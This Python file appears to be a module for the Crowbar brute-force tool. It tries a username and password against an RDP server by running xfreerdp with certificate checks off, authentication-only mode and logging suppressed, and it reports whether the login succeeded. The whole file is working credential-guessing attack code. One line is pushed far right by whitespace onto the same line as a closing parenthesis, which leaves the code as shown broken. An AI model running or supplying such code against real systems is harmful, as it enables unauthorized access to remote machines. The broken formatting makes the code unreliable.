#!/usr/bin/env python3 

import os
import subprocess

class CrowbarModule:
    def __init__(self):
        self.description = "Brute force module for RDP using xfreerdp"
        self.tool = "/usr/bin/xfreerdp"

    def run(self, ip, username, password):
        cmd = [
            self.tool,
            "/u:" + username,
            "/p:" + password, 
            "/v:" + ip,
            "/cert:ignore",
            "/auth-only",
            "/log-level:OFF"
        ]
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10
            )                                                                                                       return result.returncode == 0
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout occurred for {username}@{ip}")
            return False
        except Exception as e:
            print(f"[!] Error executing xfreerdp for {username}@{ip}: {e}")
            return False